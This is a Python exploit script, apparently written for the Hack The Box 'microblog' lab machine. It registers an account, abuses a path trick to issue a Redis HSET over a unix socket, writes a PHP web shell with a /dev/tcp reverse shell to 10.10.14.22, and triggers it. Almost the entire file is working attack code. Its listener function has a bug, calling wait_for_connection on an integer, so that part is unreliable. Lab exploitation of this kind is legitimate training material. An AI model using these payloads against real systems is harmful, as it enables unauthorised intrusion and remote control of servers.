#!/usr/bin/python3

import threading
from pwn import *
import requests
from loguru import logger
from time import sleep

def random_string(length: int = 8, charset: str = string.ascii_lowercase) -> str:
    return "".join(random.choices(charset, k=length))

def register_user(s: requests.Session):
    logger.info("Registering user")
    sleep(1)

    url = "http://app.microblog.htb:80/register/index.php"
    random_value = random_string()

    data = {"first-name": f"{random_value}", "last-name": f"{random_value}", "username": f"{random_value}", "password": f"{random_value}"}
    response = s.post(url, data=data)

    if response.status_code != 200:
        logger.error(f"Failed to register user [{response.text}]")
        exit()
    else:
        logger.success(f"User [{random_value}] registered successfully")
        return random_value
    
def create_blog(s: requests.Session):
    logger.info("Creating blog")
    sleep(1)
    url = "http://app.microblog.htb:80/dashboard/index.php"

    random_value = random_string()

    data = {"new-blog-name": f"{random_value}"}
    response = s.post(url, data=data)

    if response.status_code != 200:
        logger.error(f"Failed to create a blog [{response.text}]")
        exit()
    else:
        logger.success(f"Blog [{random_value}] created successfully")

def set_user_as_pro(username):
    logger.info("Setting user as PRO user")
    sleep(1)
    unix_socket_url = f"http://microblog.htb/static/unix:/var/run/redis/redis.sock:{username}%20pro%20true%20/pwn"
    response = requests.request("HSET", unix_socket_url)
    
    if response.status_code != 502:
        logger.error(f"Failed to communicate with redis socket [{response.text}]")
        exit()
    else:
        logger.success("Redis socket tickling, successful")

def write_payload(s: requests.Session, blog_name):
    logger.info("Writing payload")
    sleep(1)
    url = "http://oekpfmem.microblog.htb:80/edit/index.php"
    # burp0_cookies = {"username": "ra410dsf9b5v3k72rsa7fjci3k"}
    headers = {"Host": f"{blog_name}.microblog.htb"}

    folder_to_write_to = f"/var/www/microblog/{blog_name}/uploads/shell.php"
    payload = "<?php system('/bin/sh -i >& /dev/tcp/10.10.14.22/8002 0>&1'); ?>"

    data = {"id": f"{folder_to_write_to}", "header": f"{payload}"}
    response = s.post(url, headers=headers, data=data)
    
    if response.status_code != 200:
        logger.error(f"Payload writing failed [{response.text}]")
        exit()
    else:
        logger.success("Successfully wrote payload!")

def initiate_call_back():
    success("Starting reverse shell listener")
    sleep(1)
    loc_p = int(8002)
    conn = loc_p.wait_for_connection()
    conn.interactive()

def start_callback_server():
    t = threading.Thread(target=initiate_call_back)
    t.start()

def call_reverse_shell(blog_name):
    url = "http://microblog.htb/uploads/shell.php"
    headers = {"Host": f"{blog_name}.microblog.htb"}
    requests.get(url, headers=headers)


session = requests.session()

username = register_user(session)
create_blog(session)
# username = "coqbdxvf"
set_user_as_pro(username)
write_payload(session, username)
start_callback_server()
call_reverse_shell(username)